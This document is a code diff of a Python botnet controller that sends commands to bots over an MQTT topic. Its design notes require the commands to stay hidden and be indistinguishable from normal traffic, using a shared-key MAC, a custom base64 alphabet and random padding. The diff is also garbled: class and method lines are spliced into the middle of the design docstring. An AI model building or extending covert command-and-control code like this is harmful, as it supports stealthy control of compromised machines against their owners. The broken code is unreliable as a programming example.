@@ -17,9 +17,10 @@ from cryptography.hazmat.primitives import hashes, hmac
 ''' 
 The validation / authenticion logic has the following function:
    It is for the bot to decide with high confidence that the command is meant for it. 
-   Bot must recognize commands only from the controller.
+class Controller:
+    """Manages and controls bots in the network."""
    The commands must be statistically indistinguishable from normal traffic in the topic (REQUIREMENT! STAY HIDDEN).
-   Make sure that any accidental triggers are minimized. 
+        """Initialize the controller with broker, port, topic, and client ID."""
 
    Conceptual frame:
    | MAGIC | VERSION | TYPE | LENGTH | AUTH | PAYLOAD | CHECKSUM |
@@ -33,17 +34,20 @@ The validation / authenticion logic has the following function:
 
     The bot will verify these leveles one by one and if one fails, it will discard the message.
 
-
     Authentication logic:
-    - Command-bound MAC: AUTH = hash(secret_key =| payload) -> Payload can't be tampered with
     - The bot and controller share a secret key known only to them.
 
     Encoding:
     - Non-standard base64 alphabet
-    - Padding with random bytes before and after the frame to blend with noise
-
+    - Padding with random bytes before the frame to blend in the noise 
 '''
 
+def pretty_print_payload(payload: bytes):
+    try:
+        text = payload.decode()
+        print(f"\tPayload: {text}")
+    except: 
+        print(f"\tPayload: {payload}")
 class AlphabetEncoder:
     def __init__(self, standard_alphabet: str=STANDARD_ALPHABET, custom_alphabet: str=CUSTOM_ALPHABET):
         self.standard_alphabet = standard_alphabet
@@ -96,7 +100,6 @@ class Publisher():
         self.client.connect(self.broker, self.port)
         status = self.client.publish(self.topic, payload)
         self.time_sent = datetime.now()
-        print(self.time_sent)
         if status.rc != mqtt.MQTT_ERR_SUCCESS:
             print(f"(Error)\t Could not publish the message: {status.rc}")
             self._shutdown()
@@ -105,6 +108,7 @@ class Publisher():
             print(f"(Info)\t Successfully published!")
         self.client.loop_forever()
     
+
     def on_message(self, client, userdata, message):
         try:
             decoded_m = self.ph.decode_frame(message.payload)
@@ -113,7 +117,9 @@ class Publisher():
                 response_idx = list(RESP_TYPES.values()).index(cmd_type)
                 response = list(RESP_TYPES.keys())[response_idx]
                 print("(Info)\t Received response from the bot!")
-                print(f"\t Response: {response}\n\t Payload: {payload.decode()}")
+                # print(f"\t Response: {response}\n\t Payload: {payload}")
+                print(f"\t Response: {response}")
+                pretty_print_payload(payload)
 
                 # disconnect
                 self.client.loop_stop()
